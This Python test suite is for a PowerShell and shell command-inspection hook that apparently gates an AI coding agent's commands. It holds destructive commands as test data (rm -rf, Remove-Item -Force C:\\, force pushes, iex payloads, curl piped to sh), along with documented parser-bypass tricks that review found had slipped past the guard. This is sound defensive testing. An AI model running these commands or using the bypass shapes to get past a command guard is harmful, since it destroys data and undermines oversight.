"""Floor v1.6.1: literal PowerShell scriptblocks cut in half by segmentation.

`quote_aware_segments_with_operators` treats `;`, `|`, `&` and newline as command
separators even inside a `{ ... }` scriptblock, so a perfectly well-formed literal
block is routinely split across segments. The old brace scanner reported that as
"malformed" and `check()` denied — the single largest false-positive class in the
issue #21 corpus (2,659 unique commands / 3,006 invocations).

`scan_powershell_literal_block` now distinguishes a segmentation artifact
(truncated) from a block that closes more braces than it opens (malformed), and
`powershell_literal_scriptblock_bodies` yields the truncated remainder so the body
is still recursed. See issue #25.

Relaxing "malformed" also removed an ACCIDENTAL blanket deny: it had been the only
thing catching a quoted evaluator payload inside a split block. Adversarial review
found 17 such deny->allow regressions, so this slice additionally rejoins a cmdlet's
argv across the split (`complete_scriptblock_argv`), recurses literal bodies for
Where-Object and Invoke-Command as well as ForEach-Object, reads the attached
`-Parameter:{ ... }` binding, unwraps an assignment-headed body, and refuses to let
a `}` inside a `#` comment close a block.
"""

import importlib.util
import os
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
DISPATCH_PATH = ROOT / "templates" / "hooks" / "dispatch.py"


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


dispatch = load_module("dispatch_block_scan", DISPATCH_PATH)


def stub_resolver(
    args, project_dir, git_globals=None, command_runner=None, deadline=None
):
    """No network during unit tests; treat every remote as private."""
    return False, "unit-test-stub-private"


def check(command: str, tier: int = 1, flags=None):
    """Decide `command` with the host's Git config injection removed.

    `check()` reads the live environment, and an ambient `GIT_CONFIG_COUNT` /
    `GIT_CONFIG_KEY_*` / `GIT_CONFIG_VALUE_*` family makes it deny with "Git
    config environment injection is opaque to floor inspection" — which has
    nothing to do with the parser behaviour these tests assert, and made results
    depend on the host. Cleared for the duration of each decision.
    """
    tier_cfg = {"tier": tier, "flags": flags or {}}
    project_dir = str(ROOT)
    injected = {
        name: value
        for name, value in os.environ.items()
        if name.startswith("GIT_CONFIG")
    }
    for name in injected:
        del os.environ[name]
    try:
        return dispatch.check(
            command, tier_cfg, project_dir, project_dir, remote_resolver=stub_resolver
        )
    finally:
        os.environ.update(injected)


class PowershellBlockDepthTests(unittest.TestCase):
    def test_counts_plain_braces(self):
        self.assertEqual(dispatch.powershell_block_depth("{"), 1)
        self.assertEqual(dispatch.powershell_block_depth("}"), -1)
        self.assertEqual(dispatch.powershell_block_depth("{}"), 0)
        self.assertEqual(dispatch.powershell_block_depth("@{Name=$_.Name}"), 0)

    def test_backtick_escaped_braces_are_not_counted(self):
        # A backtick escapes the next character. A backtick that arrived as
        # quoted DATA is masked by protect(), so a bare one here is always an
        # escape. Counting it plainly kept the block open, swallowed the real
        # `}` and demoted the cmdlet's trailing `$sb` from a -RemainingScripts
        # scriptblock (deny) to a Write-Host argument (allow) -- so "still open"
        # is NOT the conservative reading; only the correct count is.
        self.assertEqual(dispatch.powershell_block_depth("a`{b"), 0)
        self.assertEqual(dispatch.powershell_block_depth("a`}b"), 0)
        self.assertEqual(dispatch.powershell_block_depth("{a`}"), 1)
        self.assertEqual(dispatch.powershell_block_depth("`"), 0)
        # `` is an escaped backtick, so the following `{` is a real brace.
        self.assertEqual(dispatch.powershell_block_depth("a``{b"), 1)

    def test_a_quoted_backtick_is_masked_and_still_balances(self):
        # The old docstring justified counting plainly with `{'`'}`; masking the
        # quoted backtick retires that counterexample instead of trading it away.
        segment = dispatch.quote_aware_segments_with_operators("1 | % { '`' }")[-1][0]
        self.assertTrue(any(dispatch._LITERAL_BACKTICK in t for t in segment), segment)
        self.assertEqual(sum(dispatch.powershell_block_depth(t) for t in segment), 0)
        # ...and the mask must not hide the backtick from the dynamic-token test.
        self.assertTrue(dispatch.has_dynamic_shell_token(dispatch._LITERAL_BACKTICK))


class ScanPowershellLiteralBlockTests(unittest.TestCase):
    def test_closed_block_reports_token_after_close(self):
        toks = ["ForEach-Object", "{", "$_", "}", "tail"]
        state, index = dispatch.scan_powershell_literal_block(toks, 2, "{")
        self.assertEqual(state, dispatch._BLOCK_CLOSED)
        self.assertEqual(index, 4)
        self.assertEqual(toks[index], "tail")

    def test_segment_truncated_block_is_not_malformed(self):
        toks = ["ForEach-Object", "{", "$i++"]
        state, index = dispatch.scan_powershell_literal_block(toks, 2, "{")
        self.assertEqual(state, dispatch._BLOCK_TRUNCATED)
        self.assertEqual(index, len(toks))

    def test_opening_token_that_over_closes_is_malformed(self):
        state, _index = dispatch.scan_powershell_literal_block(["x"], 0, "}")
        self.assertEqual(state, dispatch._BLOCK_MALFORMED)

    def test_nested_braces_close_at_the_outer_brace(self):
        toks = ["{", "@{", "Name", "=", "$_.Name", "}", "}", "tail"]
        state, index = dispatch.scan_powershell_literal_block(toks, 1, "{")
        self.assertEqual(state, dispatch._BLOCK_CLOSED)
        self.assertEqual(index, 7)


class LiteralScriptblockBodyTests(unittest.TestCase):
    def test_truncated_block_yields_in_segment_remainder(self):
        toks = ["ForEach-Object", "{", "rm", "-rf", "/critical/outside"]
        bodies = dispatch.powershell_literal_scriptblock_bodies(toks)
        self.assertEqual(
            bodies, [("rm -rf /critical/outside", ["rm", "-rf", "/critical/outside"])]
        )

    def test_closed_block_body_is_unchanged(self):
        toks = ["ForEach-Object", "{", "git", "status", "}"]
        self.assertEqual(
            dispatch.powershell_literal_scriptblock_bodies(toks),
            [("git status", ["git", "status"])],
        )

    def test_quoted_statement_stays_one_token(self):
        # A quoted string is ONE argv token however many words it holds; that is
        # what keeps a bare string statement inert instead of read as a command.
        toks = ["ForEach-Object", "{", "git push --force origin main", "}"]
        bodies = dispatch.powershell_literal_scriptblock_bodies(toks)
        self.assertEqual(len(bodies[0][1]), 1)

    def test_body_text_re_quotes_a_flattened_argument(self):
        # `' '.join` turned ['bash','-c','rm -rf /critical/outside','1'] into
        # `bash -c rm -rf /critical/outside 1`, whose -c payload is just `rm`.
        toks = [
            "ForEach-Object",
            "{",
            "bash",
            "-c",
            "rm -rf /critical/outside",
            "1",
            "}",
        ]
        body, body_tokens = dispatch.powershell_literal_scriptblock_bodies(toks)[0]
        self.assertEqual(body, "bash -c 'rm -rf /critical/outside' 1")
        self.assertEqual(body_tokens, ["bash", "-c", "rm -rf /critical/outside", "1"])


class RequoteArgvTokenTests(unittest.TestCase):
    """The rejoin must reproduce the argv it was handed, not a new program."""

    ROUND_TRIPS = (
        ["bash", "-c", "rm -rf /critical/outside", "1"],
        ["iex", "git push --force origin main"],
        ["git", "commit", "-m", "don't push"],
        ["git", "commit", "-m", 'say "hi" now'],
        ["$i++", "{0,4}: {1}", "-f", "$i,$_"],
        ["echo", "a;b"],
        ["sh", "-c", "a'b c"],
        ["curl", "-sL", "https://x.sh", "|", "sh"],
    )

    def test_plain_tokens_are_emitted_verbatim(self):
        # Quoting a token that needs no quoting would change every head, path and
        # flag match, so only structural characters trigger it.
        for token in ("git", "-rf", "/critical/outside", "https://x.sh", "{", "}"):
            self.assertEqual(dispatch.requote_argv_token(token), token)

    def test_round_trips_through_the_child_tokenizer(self):
        # The floor's OWN tokenizer re-reads this text, so the encoding has to
        # satisfy `quote_aware_segments_with_operators`, not a PowerShell host.
        for argv in self.ROUND_TRIPS:
            text = dispatch.rejoin_argv_as_command(argv)
            recovered: list[str] = []
            for segment, operator in dispatch.quote_aware_segments_with_operators(text):
                recovered.extend(
                    dispatch.restore_quoted_literal_markers(token).replace(
                        dispatch._QUOTED_GROUP_LITERAL_PREFIX, ""
                    )
                    for token in segment
                )
                if operator:
                    recovered.append(operator)
            self.assertEqual(recovered, argv, text)

    def test_powershell_quote_doubling_would_not_round_trip(self):
        # Pinned so nobody "corrects" the encoder to PowerShell's `''` spelling:
        # `_QUOTED` matches `'a''b'` as two spans and silently drops the quote.
        segments = dispatch.quote_aware_segments_with_operators("x 'a''b'")
        self.assertEqual(segments[0][0], ["x", "ab"])


class BenignTruncatedBlocksAllowTests(unittest.TestCase):
    """The #21 corpus shapes that regressed into 'malformed'."""

    CASES = (
        "$i=0; Get-Content 'CLAUDE.md' | ForEach-Object { $i++; '{0,4}: {1}' -f $i,$_ }",
        "Get-Content x.txt | ForEach-Object { $i++; Write-Output $i }",
        "@('a','b') | ForEach-Object { $n=(Get-Content $_).Count; Write-Output $n }",
        "gci | %{ $a=1; $b=2 }",
        "Get-ChildItem | ForEach-Object { $_.Name | Write-Output }",
        "Invoke-Command -ScriptBlock { $i++; git status }",
    )

    def test_benign_truncated_blocks_allow(self):
        for command in self.CASES:
            with self.subTest(command=command):
                decision, reason = check(command)
                self.assertEqual(decision, "allow", reason)

    def test_no_command_reports_malformed_scriptblock(self):
        for command in self.CASES:
            with self.subTest(command=command):
                _decision, reason = check(command)
                self.assertNotIn("malformed", reason)


class TruncatedBlockStillDeniesThreatsTests(unittest.TestCase):
    """Truncation must not become a laundering channel for charter shapes."""

    CASES = (
        "1 | ForEach-Object { $i++; rm -rf /critical/outside }",
        "1 | ForEach-Object { rm -rf /critical/outside ; $i++ }",
        "1 | ForEach-Object { echo a; git push --force origin main }",
        "1 | ForEach-Object { $x=1; sudo rm -rf / }",
        "1 | ForEach-Object { echo a; Remove-Item -Recurse -Force C:\\ }",
        "1 | %{ $i++; rm -rf /critical/outside }",
        "1 | ForEach-Object -Process { $i++; rm -rf /critical/outside }",
        'powershell -Command "1 | ForEach-Object { $i++; rm -rf /critical/outside }"',
        "1 | ForEach-Object { rm -rf /critical/outside `}",
        "Invoke-Command -ScriptBlock { $i++; rm -rf /critical/outside }",
    )

    def test_threat_inside_truncated_block_denies(self):
        for command in self.CASES:
            with self.subTest(command=command):
                decision, _reason = check(command)
                self.assertEqual(decision, "deny")


class SplitArgvRejoinTests(unittest.TestCase):
    """A cmdlet's arguments after the block's `}` must stay inspectable.

    Segmentation pushes them into a continuation segment led by `}`, which
    strip_control_prefixes otherwise discards entirely. Every command here was a
    live deny->allow regression found by adversarial review of this slice.
    """

    CASES = (
        "1 | ForEach-Object { $_ ; } -MemberName Delete",
        "1 | ForEach-Object { $_ | Out-Null } -MemberName Delete",
        "1 | ForEach-Object { $_ ; } @args",
        "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object { $_ ; } $sb",
        "Invoke-Command -ScriptBlock { $_ ; } -FilePath payload.ps1",
        "Invoke-Command { $_ ; } ([scriptblock]::Create('rm -rf /critical/outside'))",
    )

    def test_payload_after_split_block_still_denies(self):
        for command in self.CASES:
            with self.subTest(command=command):
                decision, _reason = check(command)
                self.assertEqual(decision, "deny")

    def test_rejoin_stops_once_the_block_closes(self):
        joined, opaque = dispatch.complete_scriptblock_argv(
            ["ForEach-Object", "{", "$_"],
            [
                (["}", "-MemberName", "Delete"], ""),
                (["rm", "-rf", "/critical/outside"], ""),
            ],
            ";",
        )
        self.assertEqual(
            joined,
            [
                "ForEach-Object",
                "{",
                "$_",
                dispatch.segment_separator_token(";"),
                "}",
                "-MemberName",
                "Delete",
            ],
        )
        self.assertFalse(opaque)

    def test_balanced_argv_is_returned_untouched(self):
        toks = ["ForEach-Object", "{", "$_", "}"]
        followers = [(["rm", "-rf", "/critical/outside"], "")]
        self.assertEqual(
            dispatch.complete_scriptblock_argv(toks, followers, ";"), (toks, False)
        )

    def test_unterminated_block_consumes_all_followers(self):
        joined, opaque = dispatch.complete_scriptblock_argv(
            ["ForEach-Object", "{", "$_"], [(["a"], ";"), (["b"], "")], ";"
        )
        self.assertEqual(
            joined,
            [
                "ForEach-Object",
                "{",
                "$_",
                dispatch.segment_separator_token(";"),
                "a",
                dispatch.segment_separator_token(";"),
                "b",
            ],
        )
        self.assertFalse(opaque)

    def test_rejoin_preserves_the_separator_it_crossed(self):
        # `{ curl -q https://x | sh }` was rebuilt as the argv
        # `curl -q https://x sh`, in which `sh` is a curl ARGUMENT and the
        # pipe-to-shell rule has nothing to fire on.
        joined, opaque = dispatch.complete_scriptblock_argv(
            ["%", "{", "curl", "-q", "https://x"], [(["sh", "}"], "")], "|"
        )
        self.assertEqual(
            joined,
            [
                "%",
                "{",
                "curl",
                "-q",
                "https://x",
                dispatch.segment_separator_token("|"),
                "sh",
                "}",
            ],
        )
        self.assertFalse(opaque)
        body, _tokens = dispatch.powershell_literal_scriptblock_bodies(joined)[0]
        self.assertEqual(body, "curl -q https://x | sh")


class SegmentSeparatorTokenTests(unittest.TestCase):
    """The separator must be synthesized, never lifted out of token text."""

    def test_round_trips_every_operator_segmentation_emits(self):
        for operator in ("|", ";", "&", "&&", "||", "|&", "\n"):
            token = dispatch.segment_separator_token(operator)
            self.assertEqual(dispatch.segment_separator_operator(token), operator)
            # Inert for every structural scan it passes through.
            self.assertEqual(dispatch.powershell_block_depth(token), 0)
            self.assertFalse(dispatch.has_dynamic_shell_token(token))

    def test_ordinary_tokens_are_not_separators(self):
        for token in ("|", ";", "git", "__HARNESS_SEGMENT_SEPARATOR_ZZ__"):
            self.assertIsNone(dispatch.segment_separator_operator(token))

    def test_a_quoted_operator_is_not_re_emitted_as_structure(self):
        # `Write-Host '|'` restores to the bare token `|`; emitting THAT as a
        # pipe would let quoted text trip the pipe-to-shell rule.
        self.assertEqual(dispatch.requote_argv_token("|"), "'|'")
        self.assertEqual(
            dispatch.requote_argv_token(dispatch.segment_separator_token("|")), "|"
        )


class BodyStatementSplitTests(unittest.TestCase):
    """A body is a statement list, not one command."""

    def test_splits_on_a_synthesized_separator_only(self):
        semi = dispatch.segment_separator_token(";")
        self.assertEqual(
            dispatch.powershell_body_statements(
                ["Write-Host", "a", semi, "$null", "=", "iex", "payload"]
            ),
            ([(["Write-Host", "a"], ";"), (["$null", "=", "iex", "payload"], "")]),
        )

    def test_a_quoted_separator_cannot_start_a_statement(self):
        # `git commit -m 'a; b'` restores to ONE token holding a `;`. Splitting
        # on token text there would let quoted prose trip a rule.
        self.assertEqual(
            dispatch.powershell_body_statements(["git", "commit", "-m", "a; b"]),
            [(["git", "commit", "-m", "a; b"], "")],
        )

    def test_a_pipeline_stays_one_statement(self):
        pipe = dispatch.segment_separator_token("|")
        self.assertEqual(
            dispatch.powershell_body_statements(
                ["curl", "-q", "https://x", pipe, "sh"]
            ),
            [(["curl", "-q", "https://x", pipe, "sh"], "")],
        )

    def test_the_operator_that_joined_them_is_reported(self):
        # `&&` and `;` differ to the cwd tracking, so the caller must be able to
        # rebuild the program with the operator that was actually written.
        andand = dispatch.segment_separator_token("&&")
        self.assertEqual(
            dispatch.powershell_body_statements(["cd", "/x", andand, "rm", "-rf", "y"]),
            [(["cd", "/x"], "&&"), (["rm", "-rf", "y"], "")],
        )


class MaskedPayloadInBodyTests(unittest.TestCase):
    """`strip_quotes` hides `iex '<payload>'` from the sanitized pass, so the
    scriptblock body is the ONLY place the floor can still see it."""

    DENIED = (
        "1 | ForEach-Object { Write-Host a; iex 'git push --force origin main' }",
        "1 | ForEach-Object { Write-Host a; $null = iex 'rm -rf /critical/outside' }",
        "1 | ForEach-Object { $x=1; iex 'rm -rf /critical/outside' }",
        "Invoke-Command -ScriptBlock { Write-Host a; iex 'git push --force origin main' }",
        "1 | ForEach-Object { $env:GIT_TRACE_REDACT='false'; git fetch }",
    )
    ALLOWED = (
        "1 | ForEach-Object { $i++; Write-Output $i }",
        "Invoke-Command -ScriptBlock { $i++; git status }",
        "1 | % { $i++; git commit -m 'a; rm -rf /critical/outside' }",
        "1 | ForEach-Object { 'cd /tmp/bad'; 'noop' }",
    )

    def test_a_later_statement_is_reachable(self):
        for command in self.DENIED:
            with self.subTest(command=command):
                self.assertEqual(check(command)[0], "deny")

    def test_inert_statements_do_not_become_false_positives(self):
        for command in self.ALLOWED:
            with self.subTest(command=command):
                self.assertEqual(check(command)[0], "allow")


class PowershellExpressionOperatorTests(unittest.TestCase):
    """`-join` is a PowerShell operator, not an unrecognized cmdlet parameter."""

    def test_recognizes_the_operator_families(self):
        for token in (
            "-join",
            "-JOIN",
            "-split",
            "-replace",
            "-eq",
            "-ceq",
            "-ilike",
            "-notmatch",
            "-and",
            "-band",
            "-shl",
            "-f",
            "-is",
            "-as",
        ):
            self.assertTrue(dispatch.powershell_expression_operator(token), token)

    def test_unknown_parameters_still_fail_closed(self):
        for token in ("-MemberName", "-Frobnicate", "--join", "-", "-jo1n"):
            self.assertFalse(dispatch.powershell_expression_operator(token), token)


class ScriptblockBodyInspectionTests(unittest.TestCase):
    """Relaxing "malformed" removed an accidental blanket deny.

    The old FP was, by accident, the only thing catching a quoted evaluator
    payload inside a block that segmentation had split. Every command here was
    deny under v1.6.0, allow under the first cut of this slice, and must stay
    deny — found by independent adversarial review.
    """

    CASES = (
        # payload in a SECOND block, reachable only via the rejoined argv
        "1 | ForEach-Object -Begin { Write-Host a; } -Process "
        "{ iex 'git push --force origin main' }",
        "1 | ForEach-Object -Begin { Write-Host a; } -Process { Remove-Item '.env' }",
        "1 | ForEach-Object { $_ ; } -End { iex 'git push --force origin main' }",
        "1 | ForEach-Object { $_ ; } { iex 'git push --force origin main' }",
        # Where-Object and Invoke-Command bodies are program text too
        "Get-Process | Where-Object { iex 'git push --force origin main' ; 1 }",
        "Invoke-Command -ScriptBlock { iex 'git push --force origin main' ; git status }",
        # attached `-Parameter:{ ... }` binding
        "1 | ForEach-Object -Process:{iex 'git push --force origin main' ; Write-Output ok}",
        # assignment-headed body would fail the letter gate
        "1 | ForEach-Object { $null = iex 'git push --force origin main' ; 1 }",
        # `}` inside a `#` comment must not close the block
        "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object -Begin "
        "{ Write-Host a; # }\n} -Process $sb",
        "Invoke-Command -ScriptBlock { Write-Host a; # }\n} @icmArgs",
    )

    def test_payloads_inside_split_blocks_still_deny(self):
        for command in self.CASES:
            with self.subTest(command=command):
                decision, _reason = check(command)
                self.assertEqual(decision, "deny")


class ScriptblockCommentTests(unittest.TestCase):
    """A `#` token in a scriptblock argv is unverifiable, so it fails closed.

    By the time argv is rebuilt, quote provenance is gone, so a line comment, a
    `<# ... #>` block comment and a quoted literal that merely starts with `#`
    are indistinguishable. Treating them all as comment text let a crafted `}`
    inside one close the block early and drop the cmdlet's trailing arguments;
    treating none as comments let a commented-out `}` close it. Both directions
    were live deny->allow regressions found in review of this branch.
    """

    def test_comment_tail_is_dropped_and_reported(self):
        # Swallowing a non-brace token is what makes a comment unverifiable.
        self.assertEqual(
            dispatch.split_segment_comment(["a", "#", "}", "-Process", "$sb"]),
            (["a"], True),
        )
        self.assertEqual(dispatch.split_segment_comment(["<#", "c", "#>"]), ([], True))
        self.assertEqual(
            dispatch.split_segment_comment(["# literal", "}", "$sb"]), ([], True)
        )

    def test_comment_swallowing_only_braces_is_harmless(self):
        # `Where-Object { $_ -match '^#' }` after cmd-escape stripping: the tail
        # is just `}`, so both readings agree and there is nothing to deny over.
        self.assertEqual(
            dispatch.split_segment_comment(["a", "#", "}"]), (["a"], False)
        )

    def test_tokenizer_records_a_quoted_comment_introducer(self):
        # Provenance is CARRIED now, not re-derived: build the token through the
        # tokenizer and the stamp is on exactly the ambiguous one.
        toks = dispatch.quote_aware_segments_with_operators(
            "1 | ForEach-Object { '#{0}' -f $_ }"
        )[-1][0]
        stamped = [t for t in toks if t.startswith(dispatch._QUOTED_SPAN_MARK)]
        self.assertEqual(len(stamped), 1, toks)
        self.assertEqual(dispatch.split_segment_comment(toks), (toks, False))

    def test_a_quoted_span_with_nothing_to_mask_is_still_provenance(self):
        # The old predicate scanned for `_LITERAL_*` markers, which exist to
        # protect `,{}`. A quoted span holding none of them restored to text
        # byte-identical to a bare comment, so everyday `git log --grep '#29'`
        # inside a scriptblock failed closed.
        toks = dispatch.quote_aware_segments_with_operators(
            "1 | ForEach-Object { git log --grep '#29' --oneline }"
        )[-1][0]
        self.assertTrue(any(dispatch.token_holds_restored_quote(t) for t in toks), toks)
        self.assertEqual(dispatch.split_segment_comment(toks), (toks, False))

    def test_a_hand_forged_marker_is_not_provenance(self):
        # Marker text is ordinary characters an attacker can type. The old
        # substring predicate trusted this token; the anchored one does not.
        forged = (
            "#" + dispatch._LITERAL_OPEN_BRACE + "0" + dispatch._LITERAL_CLOSE_BRACE
        )
        self.assertFalse(dispatch.token_holds_restored_quote(forged))
        self.assertEqual(
            dispatch.split_segment_comment([forged, "-f", "$_", "}"]), ([], True)
        )

    def test_a_typed_sentinel_cannot_forge_provenance(self):
        # The stamp is only ever PREPENDED, so a token cannot both carry it and
        # lead with `#`; the input scrub is the second, independent guarantee.
        forged = dispatch._QUOTED_SPAN_MARK + "#x"
        toks = dispatch.quote_aware_segments_with_operators(
            f"1 | ForEach-Object {{ Write-Host a {forged} }} $sb"
        )[-1][0]
        self.assertFalse(
            any(t.startswith(dispatch._QUOTED_SPAN_MARK) for t in toks), toks
        )
        self.assertEqual(
            check(
                "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object "
                f"{{ Write-Host a {forged} }} $sb"
            )[0],
            "deny",
        )

    def test_no_internal_marker_reaches_a_reason(self):
        # Pre-existing leak: `rm -rf '/critical/out,side'` reported
        # `/critical/out__HARNESS_LITERAL_COMMA_8F3A__side`.
        for command in (
            "rm -rf '/critical/out,side'",
            "rm -rf '/critical/{a}/outside'",
            "Remove-Item -Recurse -Force '/critical/{x},y'",
        ):
            with self.subTest(command=command):
                decision, reason = check(command)
                self.assertEqual(decision, "deny")
                scrubbed = dispatch.scrub_internal_markers(reason)
                self.assertNotIn("__HARNESS", scrubbed)
        self.assertIn(
            "/critical/out,side",
            dispatch.scrub_internal_markers(check("rm -rf '/critical/out,side'")[1]),
        )

    def test_no_comment_is_unchanged(self):
        self.assertEqual(
            dispatch.split_segment_comment(["a", "{", "b"]), (["a", "{", "b"], False)
        )

    def test_commented_brace_does_not_close_the_block(self):
        # The `}` inside the comment must not end the rejoin, or `-Process $sb`
        # is never seen. Dropping it exposes the real argv, which then denies on
        # the ordinary dynamic-payload branch rather than needing the fail-closed.
        # The segment consumed entirely by the comment contributes no separator,
        # so no doubled operator lands in the argv.
        joined, opaque = dispatch.complete_scriptblock_argv(
            ["ForEach-Object", "-Begin", "{", "Write-Host", "a"],
            [(["#", "}"], ";"), (["}", "-Process", "$sb"], "")],
            ";",
        )
        self.assertEqual(
            joined,
            [
                "ForEach-Object",
                "-Begin",
                "{",
                "Write-Host",
                "a",
                dispatch.segment_separator_token(";"),
                "}",
                "-Process",
                "$sb",
            ],
        )
        self.assertFalse(opaque)

    def test_every_comment_spelling_fails_closed(self):
        for command in (
            "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object -Begin "
            "{ Write-Host a; # }\n} -Process $sb",
            "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object "
            "{ Write-Host a; <# c #> } $sb",
            "$sb = { iex 'git push --force origin main' }; "
            "1 | ForEach-Object -Begin { '# literal' } -Process $sb",
            "Invoke-Command -ScriptBlock { Write-Host a; # }\n} @icmArgs",
        ):
            with self.subTest(command=command):
                self.assertEqual(check(command)[0], "deny")


class ForeachLoopStatementTests(unittest.TestCase):
    """`foreach ($x in ...)` is a loop statement, not a scriptblock cmdlet.

    It takes no arguments after its block, so rejoining its argv across a split
    only inflates the recursed body. Doing so newly blocked one real corpus
    command (a 1.5k-char doc-link checker) by dragging a later bare interpolated
    string into the body, where it read as a dynamic executable head.
    """

    def test_loop_header_is_recognised(self):
        self.assertTrue(
            dispatch.is_powershell_foreach_loop_statement(
                "foreach", ["foreach", "($x", "in", "$y)", "{"]
            )
        )

    def test_cmdlet_aliases_are_not_loop_statements(self):
        for head in ("%", "foreach-object"):
            with self.subTest(head=head):
                self.assertFalse(
                    dispatch.is_powershell_foreach_loop_statement(head, [head, "($sb)"])
                )

    def test_parenthesized_argument_without_in_is_not_a_loop(self):
        self.assertFalse(
            dispatch.is_powershell_foreach_loop_statement(
                "foreach", ["foreach", "($sb)"]
            )
        )

    def test_loop_body_payload_still_denies(self):
        decision, _reason = check(
            "foreach ($x in $y) { iex 'git push --force origin main' }"
        )
        self.assertEqual(decision, "deny")

    def test_multi_statement_loop_script_allows(self):
        command = (
            "$roots = @('docs'); $docs = @(); "
            "foreach ($root in $roots) { $docs += Get-ChildItem -LiteralPath $root }; "
            '"COUNT=$($docs.Count)"'
        )
        decision, reason = check(command)
        self.assertEqual(decision, "allow", reason)


class GluedAliasHeadTests(unittest.TestCase):
    """issue #28: `%{ ... }` glues the scriptblock onto the alias.

    `command_head` stripped a leading brace and a trailing `}` but not a trailing
    `{`, so the head read as `%{`. That matched no rule, so every
    pipeline-scriptblock guard was skipped — while the spaced `% { ... }` denied.
    """

    DENY = (
        "gci | %{ iex 'git push --force origin main' }",
        "gci | %{ Remove-Item -Recurse -Force '/critical/outside' }",
        "1 | %{ rm -rf /critical/outside }",
        "gci | ?{ iex 'git push --force origin main' }",
        "gci | ForEach-Object{ iex 'git push --force origin main' }",
        "gci | Where-Object{ rm -rf /critical/outside }",
        "Invoke-Command{ iex 'git push --force origin main' }",
        "$sb={ rm -rf /critical/outside }; 1 | %{ $_ } $sb",
        "1 | %{ $_ } -MemberName Delete",
        "powershell -Command \"gci | %{ iex 'git push --force origin main' }\"",
    )
    ALLOW = (
        "gci | %{ $a=1; $b=2 }",
        "gci | %{ $_.Name }",
        "1 | %{ $_ }",
        "gci | ?{ $_.Length -gt 10 }",
        "gci | %{ Write-Output $_ }",
    )

    def test_glued_alias_payloads_deny(self):
        for command in self.DENY:
            with self.subTest(command=command):
                self.assertEqual(check(command)[0], "deny")

    def test_benign_glued_aliases_allow(self):
        for command in self.ALLOW:
            with self.subTest(command=command):
                decision, reason = check(command)
                self.assertEqual(decision, "allow", reason)

    def test_head_splits_the_attached_block(self):
        self.assertEqual(
            dispatch.command_head(["%{", "iex", "payload", "}"]),
            ("%", ["%", "{", "iex", "payload", "}"]),
        )
        self.assertEqual(
            dispatch.command_head(["ForEach-Object{$_}"])[0], "foreach-object"
        )

    def test_unrelated_braced_token_keeps_its_head(self):
        # Only the scriptblock cmdlets split; anything else resolves as before.
        self.assertEqual(dispatch.command_head(["@{Name=1}"])[0], "@{name=1")
        self.assertEqual(dispatch.command_head(["git", "commit"])[0], "git")


class AttachedParameterBlockTests(unittest.TestCase):
    def test_attached_parameter_block_body_is_extracted(self):
        bodies = dispatch.powershell_literal_scriptblock_bodies(
            ["ForEach-Object", "-Process:{iex", "payload", "}"]
        )
        self.assertEqual(bodies, [("iex payload", ["iex", "payload"])])


class DynamicPayloadBranchesUnchangedTests(unittest.TestCase):
    """The branches this slice does NOT touch must keep denying."""

    CASES = (
        "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object $sb",
        "$sb={ rm -rf /critical/outside }; 1 | % $sb",
        "$sb={ rm -rf /critical/outside }; 1 | ForEach-Object ($sb)",
        "1 | ForEach-Object -Process $sb",
        "1 | Where-Object -FilterScript $f",
        "Get-ChildItem | ForEach-Object -MemberName Delete",
        "Get-ChildItem | ForEach-Object @args",
        "1 | ForEach-Object ([scriptblock]::Create('rm -rf /critical/outside'))",
        "Invoke-Command -ScriptBlock $sb",
        "Invoke-Command -FilePath .\\payload.ps1",
        "Invoke-Command ([scriptblock]::Create('git push --force origin main'))",
    )

    def test_dynamic_payloads_still_deny(self):
        for command in self.CASES:
            with self.subTest(command=command):
                decision, _reason = check(command)
                self.assertEqual(decision, "deny")


if __name__ == "__main__":
    unittest.main()
